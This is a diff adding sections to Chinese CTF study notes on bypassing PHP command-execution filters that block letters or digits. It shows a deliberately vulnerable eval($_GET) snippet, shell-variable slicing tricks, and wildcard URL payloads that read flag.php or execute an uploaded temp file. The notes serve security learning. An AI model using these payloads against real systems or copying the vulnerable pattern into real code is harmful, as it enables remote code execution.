@@ -143,13 +143,7 @@ require和include都是PHP中的文件包含函数，用于在脚本中包含和
 ```
 
 格式：int system ( string $command )
-
-
-
 system($command);
-
-
-
 String $command 要执行的命令
 
 ```
@@ -303,6 +297,86 @@ tac<./flag.php
 } 前面必须有 分号；（可选并非必须，但为了安全与兼容，建议加）
 } 前后都必须有 空格
 ```
+## 0x8 禁用字母（小）  
+
+[参考无字母shell](https://blog.csdn.net/qq_61839115/article/details/128446902?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-128446902-blog-141113303.235%5Ev43%5Epc_blog_bottom_relevance_base7&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-128446902-blog-141113303.235%5Ev43%5Epc_blog_bottom_relevance_base7)
+异或/或/取反/自增/上传文件
+过滤` 小写字母  换行  制表符  PATH  BASH  HOME  \  ()  []  \\  +  -  =  ^  *  & % < > ' " `
+```
+<?php
+if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
+  eval($_GET['shell']);
+}
+```
+### 没有字母就截取环境变量的字母
+
+**shell变量截取-->字母**
+```
+$VAR="abc"
+echo ${VAR:0:1}--->a
+echo ${VAR:1:1}--->b
+echo ${VAR:2:1}--->c
+```
+`${VAR:offest:length}`**从offest位置截取length长度的字符**
+
+**变量长度-->数字**
+```
+$VAR="abc"
+$SUM="asbxasj"
+echo ${#VAR}--->3
+echo ${#SUM}--->7    
+```
+`${#VAR}`**获取变量长度**
+
+常见的环境变量名
+变量名|位置及用处
+------|---------
+$PWD|当前工作目录(./var/www/html)
+$SHLVL|shell嵌套层级（默认值为1，2）本身就是纯数字${$SHLVL}->数字1
+$RANDOM|生成随机数（0-32767） ${#RANDOM}->取位数 用于Bash环境下
+$UID|当前用户UID(33->www-data   0->root)
+$USER|当前用户名
+$HOME|当前用户家目录(/home)
+$SHELL|当前用户登录shell
+$PATH|可执行文件搜索路径(./binsh)
+$IFS|内部字段分割符
+$0|当前脚本名称
+$1-$9|脚本参数
+$@|所有参数
+$#|参数个数
+${OPTIND}|当前选项索引
+${OPTARG}|当前选项参数
+${FUNCNAME}|当前函数名称
+${BASH_SOURCE}|当前脚本名称
+${BASH_LINENO}|当前行号
+${BASH_VERSION}|Bash版本
+${OSTYPE}|操作系统类型
+${MACHTYPE}|机器类型
+
+## 0x9 过滤字母但没有过滤数字
+1.文件上传->RCE漏洞
+2.尝试使用/bin目录下的可执行程序。字母用不了需要使用通配符？来占位。
+`URL?c=./bin/base64%20flag.php`----->`?c=./???/????64%20????.???`  :将文件base64编码后输出
+文件上传在一个临时目录当中结束后会删除
+
+在Linux中 `.`是可以执行脚本的
+### 如果过滤了数字
+`URL?c=.%20/???/????????[@-[]`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
